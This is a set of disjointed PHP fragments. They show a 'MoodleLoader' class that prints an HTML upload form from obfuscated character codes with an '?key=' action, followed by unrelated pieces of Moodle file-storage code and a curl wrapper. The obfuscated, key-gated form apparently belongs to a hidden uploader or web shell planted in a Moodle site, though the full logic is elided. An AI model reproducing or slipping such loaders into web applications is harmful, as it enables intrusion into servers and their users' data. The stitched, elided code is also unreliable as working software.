...
class MoodleLoader
{
	...
	private function renderForm()
	{
		...
		echo $this->toChr(array(
			...
			111,114,109,45,100,97,116,97,34,32,97,99,116,105,111,110,61,34,63,107,101,
			121,61,
		));
		echo $key;
        ...
        if (!is_null($itemid) and $files = $fs->get_area_files($contextid, $component, $filearea, $itemid)) {
            foreach ($files as $file) {
                if ($file->is_directory() and $file->get_filepath() === '/') {
                    ...
                    // by not copying the root dir we force it to be created automatically withcurrent timestamp
                    continue;
                }
...
class curl {
    ...
    protected function request($url, $options = array()) {
        ...
        $this->error = curl_error($curl);$this->errno = curl_errno($curl);
